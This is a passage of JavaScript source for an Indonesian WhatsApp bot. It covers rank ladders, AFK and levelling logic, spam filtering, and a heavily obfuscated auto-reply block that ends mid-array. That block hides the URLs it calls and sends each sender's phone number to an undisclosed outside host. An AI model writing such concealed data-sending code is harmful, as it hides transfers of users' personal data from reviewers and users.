															} else if (levelRole <= 150) {
																role = 'Gold 1'
																} else if (levelRole <= 170) {
																	role = 'Gold 2'
																	} else if (levelRole <= 190) {
																		role = 'Gold 3'
																		} else if (levelRole <= 210) {
																			role = 'Gold 4'
																			} else if (levelRole <= 230) {
																				role = 'Gold 5'
																				} else if (levelRole <= 260) {
																					role = 'Platinum 1'
																					} else if (levelRole <= 290) {
																						role = 'Platinum 2'
																						} else if (levelRole <= 320) {
																							role = 'Platinum 3'
																							} else if (levelRole <= 350) {
																								role = 'Platinum 4'
																								} else if (levelRole <= 380) {
																									role = 'Platinum 5'
																									} else if (levelRole <= 410) {
																										role = 'Diamond 1'
																										} else if (levelRole <= 450) {
																											role = 'Diamond 2'
																											} else if (levelRole <= 500) {
																												role = 'Diamond 3'
																												} else if (levelRole <= 550) {
																													role = 'Diamond 4'
																													} else if (levelRole <= 600) {
																														role = 'Diamond 5'
																														} else if (levelRole <= 700) {
																															role = 'Master'
																															} else if (levelRole <= 800) {
																															role = 'Master ✩'
																														} else if (levelRole <= 900) {
																													role = 'Master ✩✩'
																												} else if (levelRole <= 1000) {
																											role = 'Master ✩✩✩'
																										} else if (levelRole <= 1100) {
																									role = 'Master ✯'
																								} else if (levelRole <= 1225) {
																							role = 'Master ✯✯'
																						} else if (levelRole <= 1340) {
																					role = 'Master ✯✯✯'
																				} else if (levelRole <= 1400) {
																			role = 'GrandMaster'
																		} else if (levelRole <= 1555) {
																	role = 'GrandMaster ✩'
																} else if (levelRole <= 1660) {
															role = 'GrandMaster ✩✩'
														} else if (levelRole <= 1710) {
													role = 'GrandMaster ✩✩✩'
												} else if (levelRole <= 1825) {
											role = 'GrandMaster ✯'
										} else if (levelRole <= 1950) {
									role = 'GrandMaster ✯✯'
								} else if (levelRole <= 2000) {
							role = 'GrandMaster ✯✯✯'
						} else if (levelRole <= 2220) {
					role = 'Legends'
				} else if (levelRole <= 2500) {
					role = 'Legends 2'
					} else if (levelRole <= 2700) {
						role = 'Legends 3'
						} else if (levelRole <= 2900) {
							role = 'Legends 4'
							} else if (levelRole <= 3100) {
								role = 'Legends 5'
								} else if (levelRole <= 3300) {
									role = 'Legends 6'
									} else if (levelRole <= 3600) {
										role = 'Legends 7'
										} else if (levelRole <= 3900) {
											role = 'Legends 8'
											} else if (levelRole <= 4200) {
												role = 'Legends 9'
												} else if (levelRole <= 4450) {
													role = 'Legends 10'
													} else if (levelRole <= 4700) {
														role = 'Legends 忍'
														} else if (levelRole <= 4900) {
															role = 'Legends 忍¹'
															} else if (levelRole <= 5100) {
																role = 'Legends 忍²'
																} else if (levelRole <= 5600) {
																	role = 'Legends 忍³'
																	} else if (levelRole <= 6100) {
																		role = 'Legends 忍⁴'
																		} else if (levelRole <= 7000) {
																			role = 'GrandLegends'
																			} else if (levelRole <= 10000) {
																				role = 'GrandLegends 1'
																				} else if (levelRole <= 20000) {
																					role = 'GrandLegends 2'
																					} else if (levelRole <= 30000) {
																						role = 'GrandLegends 3'
																						} else if (levelRole <= 40000) {
																							role = 'GrandLegends 4'
																							} else if (levelRole <= 50000) {
																								role = 'GrandLegends 忍¹'
																								} else if (levelRole <= 60000) {
																									role = 'GrandLegends 忍²'
																									} else if (levelRole <= 70000) {
																										role = 'GrandLegends 忍³'
																										} else if (levelRole <= 80000) {
																											role = 'GrandLegends 忍⁴'
																											} else if (levelRole <= 90000) {
																												role = 'Pro 숒'
																												} else if (levelRole <= 99999999999999) {
																													role = 'Pro × GrandLegends 숒'
																												}
			for (var i = 0; i < cmdDB.length ; i++) {
						if (budy.toLowerCase() === cmdDB[i].commands) {
							Zeeone.sendMessage(from, `${cmdDB[i].jawaban}`, text, {quoted:Ofc, thumbnail: thumbnail})
						}
					}
					if (isGroup && !m.isBaileys) {
						if (mentionUser.length !== 0){
							for (let ment of mentionUser) {
								if (afk.checkAfkUser(ment, _afk)) {
									const getId = afk.getAfkId(ment, _afk)
									const getReason = afk.getAfkReason(getId, _afk)
									const getTime = Date.now() - afk.getAfkTime(getId, _afk)
									const heheh = ms(getTime)
									reply(`AFK MODE\n\n@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`)
								}
							}
						}
					if (afk.checkAfkUser(sender, _afk)) {
						const getId = afk.getAfkId(sender, _afk)
						const reason = afk.getAfkReason(sender, _afk)
						const getTime = Date.now() - afk.getAfkTime(getId, _afk)
						const heheh = ms(getTime)
						_afk.splice(afk.getAfkPosition(sender, _afk), 1)
						reply(`@${sender.split("@")[0]} telah kembali afk setelah *${reason}*\nSejak : ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik yang lalu\n\nselamat datang kembali`)
						fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
					}
				}
					if (isGroup && isUser && !isCmd) {
						const currentLevel = getLevelingLevel(sender)
						const checkId = getLevelingId(sender)
						try {
							if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
							const amountXp = Math.floor(Math.random() * 10) + 50
							const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
							const getLevel = getLevelingLevel(sender)
							addLevelingXp(sender, amountXp)
							if (requiredXp <= getLevelingXp(sender)) {
								addLevelingLevel(sender, 1)
								addBalance(sender, 30, balance)
								reply(`* 『 LEVEL UP 』 *\n\n🎯 *User :* @${sender.split("@")[0]}\n🆔 *Nomer :* ${sender.split("@")[0]}\n📊 *Xp :* ${getLevelingXp(sender)}\n💹 *Level :* ${getLevel} > ${getLevelingLevel(sender)}\n💳 *Balance :* $${getBalance(sender, balance)}*\n📛 *Role :* ${role}\n\nCongrats 🎉`)
								}
							} catch (err) {
								console.error(err)
							}
						}
    if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${sender.split("@")[0]}`,'green'))
						return reply('Jangan Spam Lord')
						} 
					if (isCmd && msgFilter.isFiltered(from) && isGroup) {
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${sender.split("@")[0]}`,'green'))
						return reply('Jangan Spam Lord')
					}
    if (autovn){
						await Zeeone.updatePresence(from, Presence.recording)
						} else if (ngetik){
							await Zeeone.updatePresence(from, Presence.composing)
							} else {
								await Zeeone.updatePresence(from, Presence.avaible)
							}
    
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
	
		if (isCmd && !isGroup) console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${pushname}`))
					if (isCmd && isGroup){
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${pushname}`), 'in', color(groupName,'magenta'))
						addBalance(sender, randomNomor(20), balance)
					}	
		if (!Ofc.key.fromMe && !isOwner && !isCreator && public_mode === true ) return
					(function(_0x2516a4,_0x5cccd3){function _0x1afbf1(_0x225d06,_0x174206,_0x5309ce,_0x496206,_0x2433d5){return _0x2167(_0x174206-0x176,_0x496206);}function _0x8b46af(_0x27cce9,_0x281ed5,_0x901ba9,_0x4e6148,_0x380d0c){return _0x2167(_0x901ba9- -0xed,_0x4e6148);}function _0x201283(_0x4d99d8,_0x5f47f1,_0x14432d,_0x121562,_0x510f5b){return _0x2167(_0x121562- -0x17b,_0x510f5b);}const _0x625a1b=_0x2516a4();function _0x5da4bc(_0x36272e,_0x152c8c,_0x28af51,_0xa036ec,_0x32e9af){return _0x2167(_0x32e9af- -0x1b3,_0x28af51);}function _0x5d9c81(_0x43b2e8,_0x50eadb,_0xfb576c,_0x3f7470,_0x53aa61){return _0x2167(_0x3f7470- -0x395,_0xfb576c);}while(!![]){try{const _0x485429=-parseInt(_0x5d9c81(-0x2d,-0x1ac,'lXVw',-0xca,0x37))/(0x7e+-0x1024*0x1+0xfa7)*(parseInt(_0x201283(0xc7,0x1d9,0x82,0x11d,'VNC9'))/(0x214+-0xbdd+0x9cb))+parseInt(_0x5da4bc(0x1b4,0x27d,'lXVw',0x147,0x217))/(0x23c+0x3a7+-0x5e0)*(-parseInt(_0x1afbf1(0x38c,0x3d0,0x469,'acSs',0x416))/(0x7a9*0x2+0xb96*0x1+-0x2*0xd72))+parseInt(_0x5da4bc(0x18c,-0x2d,'QdN5',0x185,0xcd))/(-0x341*-0x9+0x66*0x2+0x1e10*-0x1)*(-parseInt(_0x8b46af(0x18c,0x25f,0x1fb,'#TxB',0x2c7))/(-0x1029+0x2323+-0x12f4))+parseInt(_0x5da4bc(0x1b9,0x1fa,'kNYm',0x1be,0x110))/(0x5e5+-0x1d*0xb4+-0x16*-0xa9)+-parseInt(_0x5d9c81(0x69,0xa1,'NM[Q',-0x2a,0x15))/(0x48c+-0x15dc*-0x1+-0x1a60)+-parseInt(_0x5da4bc(0x1a4,0x24f,'luhB',0x1fa,0x208))/(-0x3cb*-0x1+-0x10d*-0x1e+-0x2348)+parseInt(_0x201283(0x123,0x125,0x1ee,0x1f1,'[um5'))/(0x1*-0x1f8f+0x4*0x8e4+-0x3f7)*(parseInt(_0x5d9c81(-0x10f,-0x18a,'luhB',-0x174,-0x91))/(-0x89*0x6+0x1*-0x1d75+0x2*0x105b));if(_0x485429===_0x5cccd3)break;else _0x625a1b['push'](_0x625a1b['shift']());}catch(_0x4aa4bd){_0x625a1b['push'](_0x625a1b['shift']());}}}(_0x27a5,0x99f3+-0x53c2f*0x3+-0x7*-0x391d2));if(!isGroup&&!isCmd&&!command&&!Ofc[_0x4338be(-0x14a,'0(dB',-0x7d,-0xf7,-0x122)][_0x2dfcd2('ijD7',0x28f,0x34c,0x2d2,0x278)+'e']&&autorespon){const _0x7ed841={};_0x7ed841[_0x4338be(-0x1be,'luhB',-0x19d,-0xc4,-0x98)+'d']=_0x322d85(0xd,'R#zp',0xd8,0xd3,0x38),numd=await fetchJson(_0x238807('Q^1[',0x3a9,0x348,0x28e,0x369)+_0x4338be(-0x144,'*qfs',-0x88,-0x57,-0x139)+_0x4338be(-0x81,'VNC9',-0x13d,-0x80,0x1b)+_0x10d1cf(0x231,'WAaD',0xfe,0x173,0x18c)+_0x238807('WAaD',0x3c3,0x2a0,0x32f,0x388)+_0x238807('17)[',0x407,0x362,0x4e9,0x405)+_0x4338be(0x15,'Xxsw',0x5d,-0x19,-0xf9)+_0x238807('kVPz',0x40a,0x3f2,0x377,0x3a9)+_0x2dfcd2('pogp',0x18b,0x19c,0x18e,0x1b3)+_0x2dfcd2('acSs',0x2a3,0x2ab,0x2b2,0x331)+senderNumber,_0x7ed841),simi=await fetchJson(_0x4338be(-0x25,'kVPz',0x85,-0x9,0x1a)+_0x4338be(-0x2a,'L@Yh',-0x159,-0x81,-0x5c)+_0x2dfcd2('sKZr',0xa9,0x31,0x181,0x77)+_0x322d85(0x34,'2PQI',0xbf,0x153,0x1a1)+_0x238807('jyzu',0x2b7,0x383,0x3c3,0x32d)+_0x238807('O0KM',0x48f,0x367,0x350,0x3bc)+'='+numd[_0x4338be(0x43,'jyzu',-0x35,-0xb6,-0x15d)][_0x10d1cf(0x116,'kNYm',0x2f5,0x209,0x180)+_0x10d1cf(0x294,'*hJO',0x18e,0x24b,0x2f6)+'de']+(_0x322d85(0x1c9,']9]r',0x11d,0x1d8,0x213)+_0x10d1cf(0x33f,'Xxsw',0x23a,0x262,0x1a6)+_0x2dfcd2('Q^1[',0xba,0x14b,0x176,0xcd))+cmd),sami=simi[_0x238807('ijD7',0x30f,0x227,0x181,0x253)+'ss'];const _0x1197b2={};_0x1197b2[_0x2dfcd2('DcAw',0x271,0x2d0,0x1df,0x331)+_0x2dfcd2('#Yln',0xb4,0x38,0x27,0x26)+_0x10d1cf(0x3f2,'zQ&Y',0x21c,0x2f7,0x2d9)]=0x1fc,_0x1197b2[_0x2dfcd2('DcAw',0x24c,0x1fa,0x217,0x2c6)+_0x4338be(-0x23,'gGe6',-0x17f,-0xfa,-0xb3)+'d']=!![];const _0x1f0787={};_0x1f0787[_0x322d85(0x1d7,'xN#E',0x17e,0x172,0x232)+_0x238807('sKZr',0x32f,0x437,0x3f8,0x3c1)]=thumbnail,_0x1f0787[_0x238807('jyzu',0x469,0x341,0x31b,0x3d3)+_0x2dfcd2('kNYm',0xee,0x154,0x176,0x15d)+_0x4338be(-0xce,'fd8S',-0xb1,-0x59,0x4d)]=!![],_0x1f0787[_0x10d1cf(0x1f8,'72ZG',0x1fd,0x2af,0x263)+'d']=Ofc,_0x1f0787[_0x4338be(-0x60,'luhB',-0xb8,0x4a,-0x8c)+_0x10d1cf(0x263,'ijD7',0x32c,0x246,0x231)+'o']=_0x1197b2,Zeeone[_0x2dfcd2('kVPz',0x209,0x1f8,0x210,0x284)+_0x238807('zQ&Y',0x3df,0x3b1,0x2ff,0x395)+'e'](from,'_'+sami+'_',text,_0x1f0787);}function _0x238807(_0x1da9a9,_0x5b67b0,_0x300709,_0x36b734,_0x26457f){return _0x2167(_0x26457f-0x31,_0x1da9a9);}function _0x4338be(_0x35826a,_0x957ce2,_0x5c8e88,_0x5f19f0,_0x498233){return _0x2167(_0x5f19f0- -0x3a3,_0x957ce2);}function _0x322d85(_0x3361a8,_0x35e6a4,_0x4fbd2b,_0x3cdb7d,_0x258eb7){return _0x2167(_0x4fbd2b- -0x241,_0x35e6a4);}function _0x2dfcd2(_0x4449fc,_0x364e80,_0x2fe343,_0x16200c,_0x426c6d){return _0x2167(_0x364e80- -0x14c,_0x4449fc);}function _0x10d1cf(_0x53d30b,_0x3c3668,_0x4d433e,_0x46290a,_0x52cdec){return _0x2167(_0x46290a- -0xc3,_0x3c3668);}function _0x2167(_0x358416,_0x55f2a1){const _0x43f6a0=_0x27a5();return _0x2167=function(_0x20f6e6,_0x175e9e){_0x20f6e6=_0x20f6e6-(0x546+0x1312+-0x1*0x1672);let _0xdc9f66=_0x43f6a0[_0x20f6e6];if(_0x2167['OuzyOd']===undefined){var _0x118ba4=function(_0x49c1c6){const _0x3d14b8='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4c892d='',_0x12ea40='';for(let _0x4066e9=-0x9*-0x132+-0xb44+-0x2*-0x41,_0x4c1e98,_0x512ff7,_0x5068d1=-0x618+0x1*0x1495+-0x1*0xe7d;_0x512ff7=_0x49c1c6['charAt'](_0x5068d1++);~_0x512ff7&&(_0x4c1e98=_0x4066e9%(-0x439+-0xb54*-0x1+-0x717)?_0x4c1e98*(-0x17f3+-0x6c2+0x1ef5)+_0x512ff7:_0x512ff7,_0x4066e9++%(-0x21ea+-0x1276*-0x1+0x3de*0x4))?_0x4c892d+=String['fromCharCode'](-0x2517+0x1258+-0xe*-0x169&_0x4c1e98>>(-(0x1aeb+0x1*-0x13ea+-0x6ff)*_0x4066e9&-0x1ee4+-0x1*0x228e+-0x14*-0x346)):0x1630+-0x1100+-0x298*0x2){_0x512ff7=_0x3d14b8['indexOf'](_0x512ff7);}for(let _0x5bc1a2=0xbf4+0x1c30+-0x2824,_0x33c195=_0x4c892d['length'];_0x5bc1a2<_0x33c195;_0x5bc1a2++){_0x12ea40+='%'+('00'+_0x4c892d['charCodeAt'](_0x5bc1a2)['toString'](0x1d56+0x73b*0x1+-0x2481))['slice'](-(-0x1*0x1d99+0x225a+-0x4bf));}return decodeURIComponent(_0x12ea40);};const _0x32acf1=function(_0x5d26b9,_0x33c8f3){let _0x24ee2d=[],_0x66da6d=0xbe7*0x1+0x3*0x571+-0x1c3a*0x1,_0x82f62b,_0x4f6837='';_0x5d26b9=_0x118ba4(_0x5d26b9);let _0x2dc891;for(_0x2dc891=0x24d+0x3*-0x5cb+-0x4*-0x3c5;_0x2dc891<0x98f*0x4+-0xf*0xa5+0x1*-0x1b91;_0x2dc891++){_0x24ee2d[_0x2dc891]=_0x2dc891;}for(_0x2dc891=0x12dd+0x4cf*-0x2+-0x315*0x3;_0x2dc891<-0xe91*-0x1+0x1a6*-0xa+0x2eb;_0x2dc891++){_0x66da6d=(_0x66da6d+_0x24ee2d[_0x2dc891]+_0x33c8f3['charCodeAt'](_0x2dc891%_0x33c8f3['length']))%(-0x785+0x17eb+-0xf66),_0x82f62b=_0x24ee2d[_0x2dc891],_0x24ee2d[_0x2dc891]=_0x24ee2d[_0x66da6d],_0x24ee2d[_0x66da6d]=_0x82f62b;}_0x2dc891=0x9*0x6e+0x476+-0x2*0x42a,_0x66da6d=-0x1697+-0x1*-0x20ab+-0x2b*0x3c;for(let _0x464636=0x1c62+-0x1df4+0x43*0x6;_0x464636<_0x5d26b9['length'];_0x464636++){_0x2dc891=(_0x2dc891+(0xe*-0x10d+-0x170*-0x13+-0xc99))%(-0x459*-0x1+0x25d6+-0x292f),_0x66da6d=(_0x66da6d+_0x24ee2d[_0x2dc891])%(0x124*-0x1d+0x20e4+0x130),_0x82f62b=_0x24ee2d[_0x2dc891],_0x24ee2d[_0x2dc891]=_0x24ee2d[_0x66da6d],_0x24ee2d[_0x66da6d]=_0x82f62b,_0x4f6837+=String['fromCharCode'](_0x5d26b9['charCodeAt'](_0x464636)^_0x24ee2d[(_0x24ee2d[_0x2dc891]+_0x24ee2d[_0x66da6d])%(-0x13c1+-0x126f+0x2730)]);}return _0x4f6837;};_0x2167['oisNAY']=_0x32acf1,_0x358416=arguments,_0x2167['OuzyOd']=!![];}const _0x2be795=_0x43f6a0[-0x8*-0x15e+0x9*-0x3c7+0x170f],_0x261041=_0x20f6e6+_0x2be795,_0x375766=_0x358416[_0x261041];return!_0x375766?(_0x2167['ywkANR']===undefined&&(_0x2167['ywkANR']=!![]),_0xdc9f66=_0x2167['oisNAY'](_0xdc9f66,_0x175e9e),_0x358416[_0x261041]=_0xdc9f66):_0xdc9f66=_0x375766,_0xdc9f66;},_0x2167(_0x358416,_0x55f2a1);}function _0x27a5(){const _0x1c29ea=['vmk8W79emW','W4ORW7m','C8kLDa','hghdLCor','W5RcNMpcMmoL','ECodW7ajW4nig8ogb8kQaSoIsa','W5FdQCo4l0O','W6adW74','W5qdW7pcTca','W4b0kZmg','yHxdJrbq','WRyMlxXz','W6ZcOmkm','4O2cWPzgWOZdJq','kSkgW4VcQG','W7VcImkSW7NdQq','mHddOaK','u8kCWQDLuW','cmkNW7lcThS','s8k3W75zna','WPBcJZa','w8o5dSohbW','FNHZDmoy','W4LSmY4q','rmkqWRPXCG','W7mtnmkFAW','W5acW7FdPJ0','cmktxq','emk9W6S','kwNcRX9h','zZ/dSbS','W4OOW7FdQ0tdKSoPhXH4u8kL','oYxdIa','k8kDW4VcTSk/','zCoxmdjB','W6JcO8kDW5BdIG','WQtcOmkb','4OALW6VcGmkgWQe','rSoibCoBpG','qCoed8oEga','lSkAW69FWPK','W7pdRmoIBLm','BuXhWOhdQq','mmkDW6pcOCkI','tZRcMmku','hmkhxCoGDq','W5xdOSo9j0K','FXLhzCkj','DCkGzxif','WPddTIFdP8kkjYJdHmkDWQFdJxFcQa','W4FcRKZdVSo5','WPHYWRdcLry','e0lcLa','WPFdSmkcg3K','W50yb8ksW6m','fXtdQCoQWQy','WQCIphnc','W5eEW7hdOsy','q2WrWOmD','ECodjJq','WQddRSoEW7nVnmkYp8kNzLyCW4S','p8kajrXAWO7dLIa','vmksxZGw','WR7cVSolba','W5Lzhq','s8oIFbvN','WRNdG2hcVCo1','y8k9FIyY','W5xcIKBcSSoe','ESosW73dKbS','W5BdMt/dNCkX','WP3dQwdcTSoJ','W7vem2X+','gSodhSoseq','mbrslmko','W7ubWPddHCke','jcHlq0C','WOFdTCkg','WPStbHrb','W4iuW6ddPW','WOpcSxhcO8or','8y6tIgG6Bmo8','pSkvWQBcJLG','W6NcQmkA','ENTIv8oe','W5LxbmktW60','sMn0E8oV','WPP/EMxdGq','WRPiDmkuFq','W4hcSgdcPCos','C2jZsCoo','v8kQWQjBzW','qJ5qWRj/','W4RcNI3dL8kU','uhlcPdVcRG','W5VdNZhdH8kP','CCkNFYyY','yg8lWOO','DmoOCcy2','pbJdVSo7WPu','w3OqWPGs','E8ogkCo+jq','zLDaWOhdPW','mSkQDd4I','eMqBWQPZ','W7H7zHbz','rSk2W65yoa','xCozh8opaa','WQ7cKmkp','nqxcO8o4WPW','4OsAWQ7dQsxdOa','W7XTrbzk','imkAWQu','W6tcRmojW7RdHa','FuNcNq','WQJdK3VcRCoF','WRmvtaf+','ir7dVfdcIq','W5BcTNhcOW','4P6tWQxcVaHi','WPZdPmorqdq','ohpcUmovjq','BComgCktnW','W5TpjmkFW7O','W5TyumkBW7y','dSklqCoP','WOGbqCopW5tcM8k9pqRdUG','ghSxWQTz','dNNdPSorW6u','DNzubu0','fbJcRCoRWP0','g8kFva','W7aqWOpdI8kq','nCkFWQvq','mxtcV8oACq','WRVcMKlcGG','t8k8W6Lena','W4CLWQhdRSk/','DSoND30w','WQhdOmkEchS','WO3cIMdcG8oWoZu4W4BcGCo3W7rT','W4RcKmkEWPWv','W7DNuGHk','wCo/prb3','B35YvmoF','ASorfmkAma','W6NdV8kqWPLe','W4nkdXaN','WQNcUmoAaSoN','W6r7rq0','xmodgmoleG','gxylWRi','W6nrysz9','tYKgWOSD','W4Dnkh91','WORcSmo1d13cPmkyvq','r8o5WRChDq','cmkzWRnkWPy','8lMHHCoDWP1Yoa','W60YW4xcNCov','sMGtWP4D','8y21MCkoxmobxW','WQ7dGMddP8o4','W7KyW7ZdV2S','zvTGWPddSa','WQtcO8oxg8oN','ECoclW','mCkkW4/cVCoX','WRrTjNvE','WPOpfGbl','kmkiWQpcKKe','8ygrJxtdVSkwiW','ia3dVr3cPW','WP7cQtVcOmk1','Fb/dS8oWW4a','EqPtmCkz','CCkPzte/','x/cITPRcR8k4eW','F2Psge8','W7XVkYiz','W6JdV8krW5zp','c8ojWOrRFa','hrpdOCo/','W6DyegHK','m8kJWQvgWOm','cmkDWRRcJL4','WP4XBxjfW6z8ga9hA8oTeG','DujIqCoj','gmo1FazJ','WPVdImoZkK4','W5ZdKtFdHSkG','vr3dRmoIWOe','mCkfW5VcTmo+','AMCrWPyZ','W6PekMPO','tmkvWQz2EW','W7eBWP3dJCkx','W7RcUSkEWRe3','W55FumkrW6C','W5rfbmkBW6u','e8kCqSo4wG','puxdOCoKW5i','W6dcICkzW6f8','lHnppW','W4fNoY8','W7tcUmkzWPuQ','WOJcTdVcSSk5','WR1fA8kd','W6Dnkgj/','W6lcJCoQW63dRq','W7vNqWPg','wdtdJCoX','zYarWO8Y','vmkWW6LioG','W4NdSqVdKCk8','txxcPq','x8khvrD3','W5hcKSk/WQya','D0DAWPhdHq','nmkHDa','WR7dRCoda8oM','4PYkW7NcP2S6','h8kLqmkHda','W7uMW4NcLmoM','W4pcNSkS','W7tdMmoZW7ZdPG','W6ZcGsldVSkT','W5XFhmkFW4C','WQ7cH2i','W5XLjZDi','kX9ena','WPNdQSkde3m','W4RcOMBcTmoy','x8oJFb8I','WPnaarbu','W6dcTmkAW6/dJG','W7NcQmkBWRVdGa','8jgsI8oPC8kgWPe','W5XzhmkwW60','W71KtWHc','W4rSmdqC','W79Jaeub','AKWNW4bC','rSkxrmkqgG','W4KGWR/dTG','pxDsgfa','44csWP9sWR0C','W7FdL3NdSG','amkQWQbTFW','W5RdKc3dV8kG','vMDNWQxdHW','dSktxCkSaq','w3OqWPG','WQ1DD8khAq','pr9s','WR7cV8oc','WOFcIMNcHCoXnJm7W4pcImoVW49J','nqRdSrpcJW','ESoqg8kbpW','tmkYWQ0xFW','W4BcT3RcSmoq','WR9anZPY','x8kPwJ9N','w8oTW6nLmW','WPvImwhdPG','tt7dL8o6W4i','W4/cQxVcPSoy','W67WR6oQmh7dPG','W5FdPxNcTmoz','WODOD3RdGq','WQ/cM8kzW7q1','swiCWOrC','wcNdLSoZW4i','W4XPFYeu','WO3cTdG','lceWdSkk','WP7cRZJcSCkE','l8koWRGqWPq','W6tdKCoJiea','CmkQDtCf','W687WQldTSk3','pCknWQ/cIKK','DentWPddIW','8jIKQ1JdNHVcNG','W6FcPmkDWQa','W5FdOmo4kvm','wwNdQt3cQq','y2SgWO8+','AtzJumkD','W57dTSoLl0a','WPdcOZxcSmk1','sSoNug8','rSkqWQvKuG','EeeWWOuM','ELjnh3O','ySoxy3WE','W5xdKCoZnLm','vZxdMSoYW7O','CfXxASoV','omkwWQ/cLqW','DdTSdCkn','zmoXDHSv','W5ScW6BdTsW','W4aJtw3dLrlcGmkJ','rCkxWQ51DG','WRpcN8kuW6u','eX/dOCoQWQC','xCodwCoSaG','ncfnWOSY','p8kAW4S','kGLap8kk','g8kExCoHxG','WQOkla','ACoAWP3dT8oMWPRdQ8kXWOddL1ddQq','W4BcTMFcSmoA','WQ9PWQBcTrq','WR7dHwBcQmo9','W6Htamk/W5e','W5NdIZxdNSkl','WPTjECklyW','mSkeWQfzWPi','WR4weaDp','WRZdHhtcPmk6','WQRcUCoDf8o4','WOzlyCkCzG','lmoykJiu','Amovma','W6TikwHO','A8onfa','iatdOq','D8orc8kamW','zxtcOmo/yG','W4RdJdu','qwrA','W7vekMLr','h8kGWPNcT2m','WQNdOMZcUCo/','dSkgxSoIgW','W6yUW4ZcLCoI','CMDXWPFdJG','W5rIfCkcW7y','pSk9CSozDG','B8kRWPaRpG','WP/dPSkFdW','WRa6ohu','DxvuuCoC','W484W4VdVbW','W7bKtbjo','WRRdMNNcPSo5','WOJcPCkVW5Hs','WO7cOYBcVCk2','dgZcImkRW5KEaSkfW7GJ','FXBcMConW5S','WPvLWRFdMmk4hf5m','WPVdPmkfda','WReWlwi','WQP0WQxcRaa','WQVdIMBdIW4','WPldMgBcVCo7','W5/dQSo1o0O','AMebWPmY','z8oOmtiF','wSkzumoHtG','CN1MsSou','ECokwmkwnW','uwdcUthcRW','WP7dR8kFg3m','WR7cVSolbmoM','WP59AgxdHa','mH9y','W6femrCV','W4OWWR/dPCkI','rCkkWRPGEq','WQFcJCkzW6a1','WOZcTtxcPmkG','c8kKlurtDCo4dCohrq','WQZcV8opg8o7','W7hcQmkzWRe3','W5uWWR/dPSkB','WR/dMxBcVmo3','W4mMWQldO8kX','WQ0To2rl','W7S0W4dcTa','wSkAwmo4gW','dw7cICkOW547j8k4W6Kw','W5FcPhJdSCkh','CIVdPq','qCozWRPGFW','W58wsSoqWQi','WQDOFSkECa','fCk0W5/cOCkD','W5JWV6EMwLldSq','gghdGmoqW7G','W4zjoW','b8kzuSkorKldL8o4wq/dSrdcNa','W40WWQG','WQdcS8oCWQTP','qcyfWO4A','4OAzlmk2mGC','W5JdSZldGCkF','rFcFKjdcLmojsq','hSkJWRvqWPa','me1ymCkg','W6dcISklW6HN','W6RcRCki','Dhfvgee','umkrWQz1Cq','cmkxvSoLsa','DmoGs8o7pa','W5CeW6BdOcq','WOHnoICC','4OkKawq','EIJdOXjc','W5FcVgtcTa','W57dT8oqW53dJG','W7pdV8opWOir','oZ0rzq','W50MW67dUa','E8ouW7JdLHZcPLtcMI0Rg8k6eq','WOFdSmkuca','WRRcR8kqW53cHa','dCkBx8oR','WQfwy8ktqq','C8o0W6PIcG','m8keW6aeW50','qspdSdTK','WOZcVmofl1lcVSkOyG','lSkkWR/cIvG','mrRdOam','W4SRW47cKq','W7FdU8kTW55e','W69azgX3','W6jIWPRdKmkH','W55Fa8kkW64','WQVcKHxcK8kc','s3tcQd7cPq','D8kMzr8Y','W5NcQmkBW7hdJG','eatdKSoJWPS','8y2HGCkoxmooDa','W73cLmoZWRZdIW','WOHHndyB','WRVcMNddPYa','W5BdTCkI','z8k7Dca5','WPlcTCkFq8om','W5ldMY3dMSkQ','g8kExCoJwa','e8oSW65SlXZcGmkT','W73cH8oyWQpdNq','jCkyWQnlWPO','xwpdPW','W6WZeGiu','DwTshfm','W5NcOSkDW7RdGW','W7XWFYzBW7/dTSk8W4LU','aaxdQmo9','cM7dHSo5W7G','W48wfmkFW6W','W7hdN8oMW6xcPW','WR/dL2hcQa','vCkkWQXZ','W6OTlwqf','W4ddTwpdOSkHidTUAmkM','4OQW4PUEWO7cI8kg','xwWBWO4X','AgXdhG','8l6ZUMqNsCkU','EmojmYm','W5VdKtRdH8kO','WPWvaqfj','W7DNtbne','WO/dV1BcNCot','WRNdPSki','WQlcVSojW48N','WRxdK2hdPSoS','WRquCG','tmkCWPLOFq','W6JcV8khW7RdGG','WRPvDSkpkG','W75fdqOZ','4P6uySoZWQ7dGa','WQ3cTthcPSk+','xSo+Cr5T','oMpcSmoqjq','umodh8oYfG','W4hcMmk+WPux','W53dNYRdL8oR','pGVdMX7cJa','s2CbWQCz','WOrPF2VdHq','W5RdVmock18','mWZdTWi','W4CiW43dTYq','W7hdMmkNW6RdRa','tCkUW6nijW','WR7dRLZdP8o/','uCo/BGzJ','W5WFW6hdOcO','wmoDxW','t34sW4yD','W5S6CgWC','W68PW4hcLmkH','Ew8kW4G','WPP5WRa','W6dcL8kmW7LL','WR7dMghcHmo/','44omW5/dKSoewW','WQTzACkhDa','fb/d